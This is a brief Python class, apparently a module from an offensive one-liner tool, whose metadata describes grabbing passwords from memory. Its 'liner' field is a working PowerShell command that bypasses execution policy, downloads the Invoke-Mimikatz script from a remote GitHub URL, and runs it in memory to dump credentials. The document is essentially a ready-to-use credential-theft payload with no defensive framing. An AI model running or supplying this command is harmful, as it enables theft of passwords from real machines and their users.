class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Grabing passwords from memory using Invoke-mimikatz script from PowerSploit"
    function    = "PrivEsc"
    liner     = """Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"""
